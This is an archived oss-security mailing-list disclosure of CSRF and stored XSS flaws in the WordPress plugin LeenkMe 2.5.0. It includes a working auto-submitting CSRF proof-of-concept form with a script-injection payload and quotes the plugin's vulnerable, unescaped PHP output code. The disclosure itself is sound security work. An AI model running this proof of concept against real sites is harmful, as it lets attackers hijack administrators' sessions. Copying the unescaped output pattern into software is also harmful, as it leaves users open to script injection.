X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["4132" "Saturday" "16" "April" "2016" "13:55:38" "+0530" "shravan kumar" "cor3sm4sh3r@gmail.com" "<CAOmn9FQwgG8PfecdkDLnqD8cGWTg0TKXudGs6-4J1zkFwB4+Pw@mail.gmail.com>" "121" "[oss-security] CSRF and Stored XSS in a WORDPRESS Plugin LeenkMe version 2.5.0." nil nil nil "4" "2016041608:25:38" "[oss-security] CSRF and Stored XSS in a WORDPRESS Plugin LeenkMe version 2.5.0." (number mark "U       cor3sm4sh3r@ Apr 16  121/4132  " thread-indent "\"[oss-security] CSRF and Stored XSS in a WORDPRESS Plugin LeenkMe version 2.5.0.\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 26158 invoked by uid 550); 16 Apr 2016 09:26:19 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 1947 invoked from network); 16 Apr 2016 08:25:50 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20120113;
        h=mime-version:date:message-id:subject:from:to;
        bh=zbSb0iJheBdSm9ddeXZPJba7x0lP8wX+eypi9i5iMsQ=;
        b=jhVzID+ctaAzGoz1HZVfw9K/jSs4r2npjAjvH6kNekk14jkwMD1hHIeuTkzPeU+6Sx
         cd8TnbuPitOsq2hInm46dO6C18S+5gmf0PWf74NocGg3OyyflVKtdI3FNgCoa+2Xr5gf
         sjMXKH9MWp11adHvhvZtWoVGdNONWbXQayZKy6GdOIl5huj4fXbnaSg2mXVavPnk6TfP
         9/LzsRajohnNc8A70C8Eieiuc42zwJNBLWiGI16o37xR8lkkvAsqtdBtSqfT2fK9quzy
         EQPtRyb8WKH/WBNHG3xRrF+vtQhpCIDGZ0ztd9AojVK//MKlXA6h818hxHk2yDic8r4S
         trZA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20130820;
        h=x-gm-message-state:mime-version:date:message-id:subject:from:to;
        bh=zbSb0iJheBdSm9ddeXZPJba7x0lP8wX+eypi9i5iMsQ=;
        b=A/zBatajNjQ29gfi6ohdZiKGkuIjcRRDBobQCma5MIWyJZA69UZfdKDOAilaDfeuLd
         2QjKvegNOYpZc62XuxhaPEVJ7rFtMdftUb9VkaDGfEGt+dnaSioEn1auzaLUuVHXVlSN
         RKvUnq4+YCu5lIV7dmp8qbJ3wmMw7mQo1HSxtUciyQA/+CQRDQBHf9bUKFwey2/mgqCy
         wIzFyqm73/OCES+8woSliyB3ndSHLdlUfHzxDyMlJd+hnpCSJxBV2/oum/Ese1jxXf1H
         hh9VCuyd/mO02+SLXOLICiH/5VkqIWNTL9itr4k8/WsJ2YD2FAMCwS/5AuPKskHK5UlH
         hpGw==
X-Gm-Message-State: AOPr4FUJn15i0uCEM0332C05cg1UY4rxwIgGZOlbS6xbNGCZa9Xxmmt3JkSGvsUGZ2Tc38rMui5j4RfaY4+stA==
MIME-Version: 1.0
X-Received: by 10.107.134.224 with SMTP id q93mr30638828ioi.41.1460795138385;
 Sat, 16 Apr 2016 01:25:38 -0700 (PDT)
Date: Sat, 16 Apr 2016 13:55:38 +0530
Message-ID: <CAOmn9FQwgG8PfecdkDLnqD8cGWTg0TKXudGs6-4J1zkFwB4+Pw@mail.gmail.com>
From: shravan kumar <cor3sm4sh3r@gmail.com>
To: oss-security@lists.openwall.com
Content-Type: multipart/alternative; boundary=001a113fd608503027053095df34
Subject: [oss-security] CSRF and Stored XSS in a WORDPRESS Plugin LeenkMe version 2.5.0.

--001a113fd608503027053095df34
Content-Type: text/plain; charset=UTF-8

Hello ,

I would like to disclose CSRF and stored XSS vulnerability in Wordpress
plugin LeenkMe version 2.5.0.

The plugin can be found at https://wordpress.org/plugins/leenkme/

In the page wp-content/plugins/leenkme/facebook.php

XSS vulnerable Fields are :

   - facebook_message
   - facebook_linkname
   - facebook_caption
   - facebook_description
   - default_image
   - _wp_http_referer


This CSRF is tested on latest wordpress installation 4.4.2 using firefox
browser.

The Code for CSRF.html is

<html>
  <body onload="document.forms['xss'].submit()" >
    <form name="xss" action="
http://127.0.0.1/wp/wp-admin/admin.php?page=leenkme_facebook" method="POST">
      <input type="hidden" name="facebook_profile" value="on" />
      <input type="hidden" name="fb_publish_wpnonce" value="" />
      <input type="hidden" name="_wp_http_referer" value="XSS" />
      <input type="hidden" name="facebook_message" value="XSS" />
      <input type="hidden" name="facebook_linkname" value="XSS" />
      <input type="hidden" name="facebook_caption" value="XSS" />
      <input type="hidden" name="facebook_description" value="
</textarea><script>prompt();</script>" />
      <input type="hidden" name="default_image" value="XSS" />
      <input type="hidden" name="message_preference" value="author" />
      <input type="hidden" name="clude" value="in" />
      <input type="hidden" name="publish_cats&#91;&#93;" value="0" />
      <input type="hidden" name="update_facebook_settings"
value="Save&#32;Settings" />
      <input type="submit" value="Submit form" />
    </form>
  </body>
</html>


The vulnerable page is

wp-content/plugins/leenkme/facebook.php

The vulnerable code producing XSS is


if ( !empty( $_REQUEST['facebook_message'] ) )
$user_settings['facebook_message'] = $_REQUEST['facebook_message'];
else
$user_settings['facebook_message'] = '';
if ( !empty( $_REQUEST['facebook_linkname'] ) )
$user_settings['facebook_linkname'] = $_REQUEST['facebook_linkname'];
else
$user_settings['facebook_linkname'] = '';
if ( !empty( $_REQUEST['facebook_caption'] ) )
$user_settings['facebook_caption'] = $_REQUEST['facebook_caption'];
else
$user_settings['facebook_caption'] = '';
if ( !empty( $_REQUEST['facebook_description'] ) )
$user_settings['facebook_description'] = $_REQUEST['facebook_description'];


-------------------------
-------------------------
-------------------------
snip
------------------------
-------------------------
--------------------------

<td><textarea name="facebook_message" style="width: 500px;"
maxlength="400"><?php
echo $user_settings['facebook_message']; ?></textarea></td>
                            </tr>
                            <tr>
                             <td><?php _e( 'Default Link Name:', 'leenkme'
); ?></td>
                                <td><input name="facebook_linkname"
type="text" style="width: 500px;" value="<?php echo
$user_settings['facebook_linkname']; ?>"  maxlength="100"/></td>
                            </tr>
                            <tr>
                             <td><?php _e( 'Default Caption:', 'leenkme' );
?></td>
                                <td><input name="facebook_caption"
type="text" style="width: 500px;" value="<?php echo
$user_settings['facebook_caption']; ?>" maxlength="100"/></td>
                            </tr>
                            <tr>
                             <td style='vertical-align: top; padding-top:
5px;'><?php _e( 'Default Description:', 'leenkme' ); ?></td>
                                <td><textarea name="facebook_description"
style="width: 500px;" maxlength="300"><?php echo
$user_settings['facebook_description']; ?></textarea></td>


The code used to protect against CSRF that is the anti csrf token used is

<?php wp_nonce_field( 'fb_publish', 'fb_publish_wpnonce' ); ?>


But this code is not protecting against the CSRF, the form get submitted
successfully with out any error even though the fb_publish_wpnonce is kept
empty resulting in CSRF vulnerability.

-- 
Shravan Kumar

--001a113fd608503027053095df34--
